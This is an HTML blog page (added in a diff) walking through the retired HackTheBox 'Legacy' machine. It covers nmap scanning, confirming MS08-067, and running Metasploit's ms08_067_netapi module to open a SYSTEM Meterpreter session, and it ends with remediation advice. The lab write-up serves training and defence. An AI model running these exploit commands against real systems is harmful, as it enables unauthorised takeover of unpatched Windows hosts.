@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Legacy: MS08-067 netapi from scan to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="Windows XP, port 445, one legendary patch missing: confirming and exploiting MS08-067 netapi to SYSTEM with Metasploit. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-01 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Legacy: MS08-067 netapi from scan to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Legacy is a retired HackTheBox easy Windows machine — a Windows XP box standing next to Blue in every beginner roadmap. Synopsis: SMB recon, MS08-067 confirmation, one classic exploit to SYSTEM. If you rooted Blue, Legacy teaches the older sibling of the same bug class.</p>
+<h2><span class="amber">$</span> Box info</h2>
+<p>OS: Windows XP (Professional, workgroup WORKGROUP). Difficulty: easy. Address: 10.10.10.4. Services that matter: MSRPC on 135, NetBIOS on 139, SMB on 445. Skills exercised: SMB enumeration on legacy Windows, vulnerability confirmation, Metasploit auto-targeting, SYSTEM flag hunting.</p>
+<h2><span class="amber">$</span> Skills required</h2>
+<p>Nmap service and script scanning, Metasploit module configuration (RHOSTS/LHOST discipline), Meterpreter basics.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap plus vuln confirm</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: services plus MS08-067 check</span>
+nmap -sC -sV -oN legacy.nmap 10.10.10.4
+nmap --script smb-vuln-ms08-067 -p 445 10.10.10.4 -oN legacy.ms08-067</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: XP-era SMB surface</span>
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service Info: OS: Windows XP</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># smb-vuln-ms08-067: confirmed vulnerable</span>
+Host script results:
+| smb-vuln-ms08-067:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMB server (ms08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250</pre>
+<p>Microsoft-DS on 445 with an XP-era fingerprint, plus NetBIOS alongside. The script flags the NetAPI buffer overflow (MS08-067, CVE-2008-4250) — confirmed CVE, not a hunch, and the green light for the netapi path.</p>
+<h2><span class="amber">$</span> Exploitation — MS08-067 netapi</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: ms08_067_netapi</span>
+msfconsole -q
+msf6 &gt; use exploit/windows/smb/ms08_067_netapi
+msf6 exploit(ms08_067_netapi) &gt; set RHOSTS 10.10.10.4
+msf6 exploit(ms08_067_netapi) &gt; set LHOST 10.10.14.23
+msf6 exploit(ms08_067_netapi) &gt; run
+[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.4:XXXX)</pre>
+<p>The module fingerprints the exact XP service pack automatically and lands a session as NT AUTHORITY\SYSTEM.</p>
+<h2><span class="amber">$</span> Flags</h2>
+<p>User-accessible user.txt plus root.txt in the Administrator profile — both fall in the single SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Why this works</h2>
+<p>MS08-067 is a stack overflow in the Server service NetpwPathCanonicalize function — a canonicalization bug in an RPC-reachable path. Like EternalBlue after it, one malformed request equals SYSTEM.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Picking the wrong target index manually (let the module auto-target — it reads the fingerprint better than I guess it) and forgetting LHOST after a VPN reconnect (the silent session-that-never-calls-home, again).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>MS08-067 was the Conficker worm vector in 2008 — patch it, retire XP, block 445 at the edge, and inventory any remaining legacy Windows before an attacker does. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
